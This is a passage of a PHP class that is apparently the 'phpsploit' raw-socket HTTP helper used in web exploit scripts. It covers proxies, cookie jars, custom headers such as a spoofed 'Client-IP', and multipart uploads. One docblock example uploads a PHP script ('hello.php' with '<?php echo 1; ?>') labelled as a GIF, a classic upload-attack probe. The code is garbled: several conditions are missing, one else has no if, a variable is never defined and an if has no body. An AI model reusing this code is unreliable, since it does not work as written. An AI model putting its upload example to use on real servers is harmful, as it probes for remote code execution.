	 * 
	 */
	function sock()
	{
		if(!empty($this->proxyhost) && !empty($this->proxyport))
		   $socket = @fsockopen($this->proxyhost,$this->proxyport);
		else
		   $socket = @fsockopen($this->host,$this->port);
		
		if(!$socket)
		   die("Error: Host seems down");
		
		if($this->method==&#039;get&#039;)
		   $this->packet = &#039;GET &#039;.$this->url." HTTP/1.1\r\n";
		   
		elseif($this->method==&#039;post&#039; or $this->method==&#039;formdata&#039;)
		   $this->packet = &#039;POST &#039;.$this->url." HTTP/1.1\r\n";
		   
		else
		   die("Error: Invalid method");
		
		if(!empty($this->proxyuser))
		   $this->packet .= &#039;Proxy-Authorization: Basic &#039;.base64_encode($this->proxyuser.&#039;:&#039;.$this->proxypass)."\r\n";
		
		if(!empty($this->header))
		   $this->packet .= $this->showheader();
		   
		if(!empty($this->cookie))
		   $this->packet .= &#039;Cookie: &#039;.$this->showcookie()."\r\n";
	
		$this->packet .= &#039;Host: &#039;.$this->host."\r\n";
		$this->packet .= "Connection: Close\r\n";
		
		if($this->method==&#039;post&#039;)
		{
			$this->packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
			$this->packet .= &#039;Content-Length: &#039;.strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data."\r\n";
		}
		elseif($this->method==&#039;formdata&#039;)
		{
			$this->packet .= &#039;Content-Type: multipart/form-data; boundary=&#039;.str_repeat(&#039;-&#039;,27).$this->boundary."\r\n";
			$this->packet .= &#039;Content-Length: &#039;.strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data;
		}

		$this->packet .= "\r\n";
		$this->recv = &#039;&#039;;

		fputs($socket,$this->packet);

		while(!feof($socket))
		   $this->recv .= fgets($socket);

		fclose($socket);

		if($this->cookiejar)
		   $this->getcookie();

		if($this->allowredirection)
		   return $this->getredirection();
		else
		   return $this->recv;
	}
	

	/**
	 * This function allows you to add several
	 * cookies in the request.
	 * 
	 * @access  public
	 * @param   string cookn CookieName
	 * @param   string cookv CookieValue
	 * @example $this->addcookie(&#039;name&#039;,&#039;value&#039;)
	 * 
	 */
	function addcookie($cookn,$cookv)
	{
		if(!isset($this->cookie))
		   $this->cookie = array();

		$this->cookie[$cookn] = $cookv;
	}


	/**
	 * This function allows you to add several
	 * headers in the request.
	 *
	 * @access  public
	 * @param   string headern HeaderName
	 * @param   string headervalue Headervalue
	 * @example $this->addheader(&#039;Client-IP&#039;, &#039;128.5.2.3&#039;)
	 * 
	 */
	function addheader($headern,$headervalue)
	{
		if(!isset($this->header))
		   $this->header = array();
		   
		$this->header[$headern] = $headervalue;
	}


	/**
	 * This function allows you to use an
	 * http proxy server. Several methods
	 * are supported.
	 * 
	 * @access  public
	 * @param   string proxy ProxyHost
	 * @param   integer proxyp ProxyPort
	 * @example $this->proxy(&#039;localhost&#039;,8118)
	 * @example $this->proxy(&#039;localhost:8118&#039;)
	 * 
	 */
	function proxy($proxy,$proxyp=&#039;&#039;)
	{
		if(empty($proxyp))
		{
			$proxarr = explode(&#039;:&#039;,$proxy);
			$this->proxyhost = $proxarr[0];
			$this->proxyport = (int)$proxarr[1];
		}
		else 
		{
			$this->proxyhost = $proxy;
			$this->proxyport = (int)$proxyp;
		}

		if($this->proxyport > 65535)
		   die("Error: Invalid port number");
	}
	

	/**
	 * This function allows you to use an
	 * http proxy server which requires a
	 * basic authentification. Several
	 * methods are supported:
	 *
	 * @access  public
	 * @param   string proxyauth ProxyUser
	 * @param   string proxypass ProxyPass
	 * @example $this->proxyauth(&#039;user&#039;,&#039;pwd&#039;)
	 * @example $this->proxyauth(&#039;user:pwd&#039;);
	 * 
	 */
	function proxyauth($proxyauth,$proxypass=&#039;&#039;)
	{
		if(empty($proxypass))
		{
			$posvirg = strpos($proxyauth,&#039;:&#039;);
			$this->proxyuser = substr($proxyauth,0,$posvirg);
			$this->proxypass = substr($proxyauth,$posvirg+1);
		}
		else
		{
			$this->proxyuser = $proxyauth;
			$this->proxypass = $proxypass;
		}
	}


	/**
	 * This function allows you to set
	 * the &#039;User-Agent&#039; header.
	 * 
	 * @access  public
	 * @param   string useragent Agent
	 * @example $this->agent(&#039;Firefox&#039;)
	 * 
	 */
	function agent($useragent)
	{
		$this->addheader(&#039;User-Agent&#039;,$useragent);
	}

	
	/**
	 * This function returns the headers
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this->header_str Headers
	 * @example $this->showheader()
	 * 
	 */
	function showheader()
	{
		$this->header_str = &#039;&#039;;
		
		if(!isset($this->header))
		   return;
		   
		foreach($this->header as $name => $value)
		   $this->header_str .= $name.&#039;: &#039;.$value."\r\n";
		   
		return $this->header_str;
	}

	
	/**
	 * This function returns the cookies
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this->cookie_str Cookies
	 * @example $this->showcookie()
	 * 
	 */
	function showcookie()
	{
		$this->cookie_str = &#039;&#039;;
		
		if(!isset($this->cookie))
		   return;
		
		foreach($this->cookie as $name => $value)
		   $this->cookie_str .= $name.&#039;=&#039;.$value.&#039;; &#039;;

		return $this->cookie_str;
	}


	/**
	 * This function returns the last
	 * formed http request.
	 * 
	 * @access  public
	 * @return  string $this->packet HttpPacket
	 * @example $this->showlastrequest()
	 * 
	 */
	function showlastrequest()
	{
		if(!isset($this->packet))
		   return;
		else
		   return $this->packet;
	}


	/**
	 * This function sends the formed
	 * http packet with the GET method.
	 * 
	 * @access  public
	 * @param   string url Url
	 * @return  string $this->sock()
	 * @example $this->get(&#039;localhost/index.php?var=x&#039;)
	 * @example $this->get(&#039;http://localhost:88/tst.php&#039;)
	 * 
	 */
	function get($url)
	{
		$this->target($url);
		$this->method = &#039;get&#039;;
		return $this->sock();
	}

	
	/**
	 * This function sends the formed
	 * http packet with the POST method.
	 *
	 * @access  public
	 * @param   string url  Url
	 * @param   string data PostData
	 * @return  string $this->sock()
	 * @example $this->post(&#039;http://localhost/&#039;,&#039;helo=x&#039;)
	 * 
	 */	
	function post($url,$data)
	{
		$this->target($url);
		$this->method = &#039;post&#039;;
		$this->data = $data;
		return $this->sock();
	}
	

	/**
	 * This function sends the formed http
	 * packet with the POST method using
	 * the multipart/form-data enctype.
	 * 
	 * @access  public
	 * @param   array array FormDataArray
	 * @return  string $this->sock()
	 * @example $formdata = array(
	 *                      frmdt_url => &#039;http://localhost/upload.php&#039;,
	 *                      frmdt_boundary => &#039;123456&#039;, # Optional
	 *                      &#039;var&#039; => &#039;example&#039;,
	 *                      &#039;file&#039; => array(
	 *                                frmdt_type => &#039;image/gif&#039;,  # Optional
	 *                                frmdt_transfert => &#039;binary&#039; # Optional
	 *                                frmdt_filename => &#039;hello.php,
	 *                                frmdt_content => &#039;<?php echo 1; ?>&#039;));
	 *          $this->formdata($formdata);
	 * 
	 */
	function formdata($array)
	{
		$this->target($array[frmdt_url]);
		$this->method = &#039;formdata&#039;;
		$this->data = &#039;&#039;;
		
		if(!isset($array[frmdt_boundary]))
		   $this->boundary = &#039;phpsploit&#039;;
		else
		   $this->boundary = $array[frmdt_boundary];

		foreach($array as $key => $value)
		{
			{
				$this->data .= str_repeat(&#039;-&#039;,29).$this->boundary."\r\n";
				$this->data .= &#039;Content-Disposition: form-data; name="&#039;.$key.&#039;";&#039;;
				
				if(!is_array($value))
				{
					$this->data .= "\r\n\r\n".$value."\r\n";
				}
				else
				{
					$this->data .= &#039; filename="&#039;.$array[$key][frmdt_filename]."\";\r\n";

					if(isset($array[$key][frmdt_type]))
					   $this->data .= &#039;Content-Type: &#039;.$array[$key][frmdt_type]."\r\n";

					if(isset($array[$key][frmdt_transfert]))
					   $this->data .= &#039;Content-Transfer-Encoding: &#039;.$array[$key][frmdt_transfert]."\r\n";

					$this->data .= "\r\n".$array[$key][frmdt_content]."\r\n";
				}
			}
		}

		$this->data .= str_repeat(&#039;-&#039;,29).$this->boundary."--\r\n";
		return $this->sock();
	}

	
	/**
	 * This function returns the content
	 * of the server response, without
	 * the headers.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this->server_content
	 * @example $this->getcontent()
	 * @example $this->getcontent($this->get(&#039;http://localhost/&#039;))
	 * 
	 */
	function getcontent($code=&#039;&#039;)
	{
		if(empty($code))
		   $code = $this->recv;

		$code = explode("\r\n\r\n",$code);
		$this->server_content = &#039;&#039;;
		
		for($i=1;$i<count($code);$i++)
		   $this->server_content .= $code[$i];

		return $this->server_content;
	}

	
	/**
	 * This function returns the headers
	 * of the server response, without
	 * the content.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this->server_header
	 * @example $this->getcontent()
	 * @example $this->getcontent($this->post(&#039;http://localhost/&#039;,&#039;1=2&#039;))
	 * 
	 */
	function getheader($code=&#039;&#039;)
	{
		if(empty($code))
		   $code = $this->recv;

		$code = explode("\r\n\r\n",$code);
		$this->server_header = $code[0];
		
		return $this->server_header;
	}

	
	/**
	 * This function is called by the
	 * cookiejar() function. It adds the
	 * value of the "Set-Cookie" header
	 * in the "Cookie" header for the
	 * next request. You don&#039;t have to
	 * call it.
	 * 
	 * @access private
	 * @param  string code ServerResponse
	 * 
	 */
	function getcookie()
	{
		foreach(explode("\r\n",$this->getheader()) as $header)
		{
			{
				$fequal = strpos($header,&#039;=&#039;);
				$fvirgu = strpos($header,&#039;;&#039;);
				
				// 12=strlen(&#039;set-cookie: &#039;)
				$cname  = substr($header,12,$fequal-12);
				$cvalu  = substr($header,$fequal+1,$fvirgu-(strlen($cname)+12+1));
				
				$this->cookie[trim($cname)] = trim($cvalu);
			}
		}
	}


	/**
	 * This function is called by the
	 * get()/post() functions. You
	 * don&#039;t have to call it.
	 *
	 * @access  private
	 * @param   string urltarg Url
	 * @example $this->target(&#039;http://localhost/&#039;)
	 * 
	 */
	function target($urltarg)
	{
		if(!ereg(&#039;^http://&#039;,$urltarg))
		   $urltarg = &#039;http://&#039;.$urltarg;
		   
		$urlarr     = parse_url($urltarg);
		$this->url  = &#039;http://&#039;.$urlarr[&#039;host&#039;].$urlarr[&#039;path&#039;];
		
		if(isset($urlarr[&#039;query&#039;]))
		   $this->url .= &#039;?&#039;.$urlarr[&#039;query&#039;];
		
		$this->port = !empty($urlarr[&#039;port&#039;]) ? $urlarr[&#039;port&#039;] : 80;
		$this->host = $urlarr[&#039;host&#039;];
		
		if($this->port != &#039;80&#039;)
		   $this->host .= &#039;:&#039;.$this->port;

		if(!isset($urlarr[&#039;path&#039;]) or empty($urlarr[&#039;path&#039;]))

		$this->path = substr($urlarr[&#039;path&#039;],0,strrpos($urlarr[&#039;path&#039;],&#039;/&#039;)+1);

		if($this->port > 65535)
		   die("Error: Invalid port number");
	}
	
	
	/**
	 * If you call this function,
	 * the script will extract all
	 * &#039;Set-Cookie&#039; headers values
	 * and it will automatically add
	 * them into the &#039;Cookie&#039; header
	 * for all next requests.
	 *
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this->cookiejar(0)
	 * @example $this->cookiejar(1)
	 * 
	 */
	function cookiejar($code)
	{
		if($code==&#039;0&#039;)
		   $this->cookiejar=FALSE;

		elseif($code==&#039;1&#039;)
		   $this->cookiejar=TRUE;
	}


	/**
	 * If you call this function,
	 * the script will follow all
	 * redirections sent by the server.
	 * 
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this->allowredirection(0)
	 * @example $this->allowredirection(1)
	 * 
	 */
	function allowredirection($code)
	{
		if($code==&#039;0&#039;)
		   $this->allowredirection=FALSE;
		   
		elseif($code==&#039;1&#039;)
		   $this->allowredirection=TRUE;
	}

	
	/**
	 * This function is called if
	 * allowredirection() is enabled.
	 * You don&#039;t have to call it.
	 *
	 * @access private
	 * @return string $this->get(&#039;http://&#039;.$this->host.$this->path.$this->last_redirection)
	 * @return string $this->get($this->last_redirection)
	 * @return string $this->recv;
	 * 
	 */
	function getredirection()
	{
		{
			$this->last_redirection = trim($codearr[2]);
			
			if(!ereg(&#039;://&#039;,$this->last_redirection))
			   return $this->get(&#039;http://&#039;.$this->host.$this->path.$this->last_redirection);

			else
			   return $this->get($this->last_redirection);
		}
		else
		   return $this->recv;
	}


	/**
	 * This function allows you
	 * to reset some parameters.
	 * 
	 * @access  public
	 * @param   string func Param
	 * @example $this->reset(&#039;header&#039;)
	 * @example $this->reset(&#039;cookie&#039;)
	 * @example $this->reset()
	 * 
	 */
	function reset($func=&#039;&#039;)
	{
		switch($func)
		{
			case &#039;header&#039;:
			$this->header = array();
			break;
				
			case &#039;cookie&#039;:
			$this->cookie = array();
			break;
				
			default:
			$this->cookiejar = &#039;&#039;;
			$this->header = array();
			$this->cookie = array();
			$this->allowredirection = &#039;&#039;;
			break;
		}
	}
}

?>



